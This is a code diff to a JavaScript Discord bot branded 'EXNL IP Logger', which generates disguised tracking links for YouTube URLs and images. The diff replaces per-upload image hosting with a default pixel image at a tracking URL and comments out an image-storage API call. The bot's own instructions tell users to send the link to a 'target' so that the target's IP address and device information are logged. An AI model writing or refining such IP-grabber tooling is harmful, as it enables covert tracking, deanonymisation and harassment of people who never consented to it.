@@ -1138,7 +1138,7 @@ async function handleYouTubeCommand(interaction) {
 
         await interaction.user.send({ embeds: [dmEmbed] });
 
-        // Store tracking data with webhook if configured
+        // Store tracking data locally with webhook if configured
         storeTrackingData(interaction.user.id, {
             type: 'youtube',
             originalUrl: youtubeUrl,
@@ -1169,25 +1169,11 @@ async function handleImageCommand(interaction) {
     await interaction.deferReply({ ephemeral: true });
 
     try {
-        // Download and process image
-        const imageResponse = await fetch(imageAttachment.url);
-        const imageBuffer = await imageResponse.buffer();
-        const imageBase64 = imageBuffer.toString('base64');
-
-        // Generate tracking link
+        // Generate tracking link (same format as website)
         const trackingId = generateTrackingId();
-        const fileName = imageAttachment.name.split('.')[0];
-        const extension = imageAttachment.name.split('.').pop();
-        const trackingUrl = `${API_BASE_URL}/${fileName}_${trackingId}.${extension}`;
+        const trackingUrl = `${API_BASE_URL}/raw/image.jpg?tid=${trackingId}`;
 
-        // Store image data (you'll need to implement this in your API)
-        await storeImageForTracking(trackingId, {
-            imageData: imageBase64,
-            imageType: imageAttachment.contentType,
-            imageName: imageAttachment.name,
-            userId: interaction.user.id,
-            webhook: userWebhooks.get(interaction.user.id)
-        });
+        // Note: Bot uses default pixel image. Users must upload custom images via website.
 
         const embed = new EmbedBuilder()
             .setColor('#00FF00')
@@ -1195,22 +1181,22 @@ async function handleImageCommand(interaction) {
             .setDescription('Your image tracking link has been created!')
             .addFields(
                 {
-                    name: '🖼️ Original Image',
-                    value: `\`${imageAttachment.name}\``,
-                    inline: false
-                },
-                {
                     name: '🎯 Tracking Link',
                     value: `\`${trackingUrl}\``,
                     inline: false
                 },
                 {
                     name: '📋 Instructions',
-                    value: 'Copy the tracking link and send it to your target. When they view the image, their IP and device info will be logged.',
+                    value: 'This link shows a default pixel image and logs IP data. To use custom images, upload them via the website.',
+                    inline: false
+                },
+                {
+                    name: '💡 Note',
+                    value: 'The uploaded image is for reference only. The tracking link uses the default website image.',
                     inline: false
                 }
             )
-            .setImage(imageAttachment.url)
+//.setImage(imageAttachment.url) // Removed - tracking uses default image
             .setFooter({ text: '🕵️ EXNL IP Logger | Image Tracker' })
             .setTimestamp();
 
@@ -1300,9 +1286,11 @@ function getTrackingData(userId, trackingId) {
 }
 
 async function storeImageForTracking(trackingId, imageData) {
-    // This would integrate with your existing API to store the image
+    // Local storage only - images handled by website
     try {
-        const response = await fetch(`${API_BASE_URL}/api/store-tracking-image`, {
+        // Just store locally for reference, no API call needed
+        return true;
+        /*const response = await fetch(`${API_BASE_URL}/api/store-tracking-image`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -1317,7 +1305,7 @@ async function storeImageForTracking(trackingId, imageData) {
             throw new Error('Failed to store image');
         }
         
-        return await response.json();
+        return await response.json();*/
     } catch (error) {
         console.error('Failed to store tracking image:', error);
         throw error;
